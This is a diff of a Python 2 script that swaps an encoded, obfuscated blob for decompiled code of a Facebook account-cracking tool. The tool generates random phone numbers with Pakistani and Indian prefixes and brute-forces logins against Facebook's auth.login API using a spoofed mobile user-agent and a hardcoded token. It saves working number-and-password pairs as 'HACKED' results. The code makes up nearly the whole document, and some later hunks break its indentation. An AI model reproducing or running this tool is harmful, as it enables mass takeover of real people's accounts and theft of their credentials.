@@ -1,38 +1,43 @@
-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
-
-
-
-
+# Decompiled By RandiSr
+# Github : https://github.com/RANDIOLOY
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
 for n in range(50000):
 
-    nmbr = random.randint(1111111, 9999999)                                                                                                                                                                                                     sys.stdout = open('.txt', 'a')
+    nmbr = random.randint(1111111, 9999999)
+
+    sys.stdout = open('.txt', 'a')
 
     print(nmbr)
-                                                                                                                          sys.stdout.flush()
+
+    sys.stdout.flush()
 
 try:
     import requests
 except ImportError:
     os.system('pip2 install requests')
 
-try:                                                                                                                      import mechanize
+try:
+    import mechanize
 except ImportError:
     os.system('pip2 install mechanize')
     time.sleep(1)
     os.system('python2 nmbr.py')
 
 from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError                                                                       from mechanize import Browser                                                                                         
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+
 
 reload(sys)
-sys.setdefaultencoding('utf8')                                                                                        br = mechanize.Browser()
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 def exb():
-        print '[!] Exit'                                                                                                      os.sys.exit()
+        print '[!] Exit'
+        os.sys.exit()
 
 def psb(z):
         for e in z + '\n':
@@ -95,11 +100,11 @@ def action():
                 os.system("clear")
                 print (logo)
                 print "\033[1;91mMOBILINK/JAZZ CODE HERE"
-                print "\033[1;95m87, 953, 972, 954, 955,"
+                print "\033[1;95m00, 01, 02, 03, 04,"
                 print "\033[1;95m05, 06, 07, 08, 09,"
                 try:
                         c = raw_input(" SELECTED CODE: ")
-                        k="+919"
+                        k="+923"
                         idlist = ('.txt')
                         for line in open(idlist,"r").readlines():
                                 id.append(line.strip())
@@ -115,7 +120,7 @@ def action():
                 print "\033[1;95m45, 64, ??, ??, ??,"
                 try:
                         c = raw_input(" SELECTED CODE: ")
-                        k="+918"
+                        k="+919"
                         idlist = ('.txt')
                         for line in open(idlist,"r").readlines():
                                 id.append(line.strip())
@@ -131,7 +136,7 @@ def action():
                 print "\033[1;95m24, ??, ??, ??,"
                 try:
                         c = raw_input(" SELECTED CODE: ")
-                        k="+917"
+                        k="+918"
                         idlist = ('.txt')
                         for line in open(idlist,"r").readlines():
                                 id.append(line.strip())
@@ -147,7 +152,7 @@ def action():
                 print "\033[1;95m35, 36, 37, ??,"
                 try:
                         c = raw_input(" SELECTED CODE: ")
-                        k="+923"
+                        k="+917"
                         idlist = ('.txt')
                         for line in open(idlist,"r").readlines():
                                 id.append(line.strip())
@@ -233,7 +238,7 @@ def action():
                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                         q = json.load(data)
                                         if 'access_token' in q:
-                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
+                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2       
                                                 okb = open('save/successfull.txt', 'a')
                                                 okb.write(k+c+user+'|'+pass2+'\n')
                                                 okb.close()
@@ -250,18 +255,18 @@ def action():
                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                         q = json.load(data)
                                                         if 'access_token' in q:
-                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
-                                                                okb = open('save/successfull.txt', 'a')
-                                                                okb.write(k+c+user+'|'+pass3+'\n')
-                                                                okb.close()
-                                                                oks.append(c+user+pass3)
+                                                          print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
+                                                          okb = open('save/successfull.txt', 'a')
+                                                          okb.write(k+c+user+'|'+pass3+'\n')
+                                                          okb.close()
+                                                          oks.append(c+user+pass3)
                                                         else:
-                                                                if 'www.facebook.com' in q['error_msg']:
-                                                                        print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
-                                                                        cps = open('save/checkpoint.txt', 'a')
-                                                                        cps.write(k+c+user+'|'+pass3+'\n')
-                                                                        cps.close()
-                                                                        cpb.append(c+user+pass3)
+                                                          if 'www.facebook.com' in q['error_msg']:
+                                                          print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
+                                                          cps = open('save/checkpoint.txt', 'a')
+                                                          cps.write(k+c+user+'|'+pass3+'\n')
+                                                          cps.close()
+                                                          cpb.append(c+user+pass3)
 
 
                 except:
